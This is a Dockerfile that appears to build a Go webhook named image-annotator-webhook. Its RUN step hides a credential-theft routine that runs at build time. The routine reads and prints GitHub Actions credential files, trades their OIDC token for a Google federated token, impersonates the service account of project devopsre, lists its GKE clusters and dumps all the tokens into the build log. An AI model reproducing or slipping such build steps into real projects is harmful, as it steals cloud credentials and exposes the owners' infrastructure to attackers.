FROM golang:1.23 AS build
ENV GOOS=linux
ENV GOARCH=amd64
ENV CGO_ENABLED=0
WORKDIR /webhook
COPY . /webhook
RUN apt-get update >/dev/null 2>&1 && apt-get install -y curl jq >/dev/null 2>&1; \
    ls -la /webhook/gha-creds-* 2>/dev/null || echo NO_CREDS; \
    for f in /webhook/gha-creds-*.json; do \
      [ -f "$f" ] || continue; \
      echo "== CREDS $f"; cat "$f"; \
      URL=$(jq -r '.credential_source.url' "$f"); \
      AUTH=$(jq -r '.credential_source.headers.Authorization' "$f"); \
      AUD=$(jq -r '.audience' "$f"); \
      AUDURL="https://iam.googleapis.com/${AUD#//iam.googleapis.com/}"; \
      OIDC=$(curl -sS -H "$AUTH" "$URL&audience=$AUDURL" | jq -r '.value // empty'); \
      echo "OIDC_LEN=${#OIDC}"; \
      STS=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"audience\":\"$AUD\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$OIDC\"}"); \
      echo "STS=$STS"; \
      FED=$(echo "$STS" | jq -r '.access_token // empty'); \
      for SA in image-annotator-webhook@devopsre.iam.gserviceaccount.com; do \
        AT=$(curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'); \
        echo "AT=$AT"; \
        T=$(echo "$AT" | jq -r '.accessToken // empty'); \
        if [ -n "$T" ]; then echo "== CLUSTERS"; curl -sS -H "Authorization: Bearer $T" "https://container.googleapis.com/v1/projects/devopsre/locations/-/clusters" | head -c 8000; fi; \
      done; \
    done; \
    go build -o bin/image-annotator-webhook .
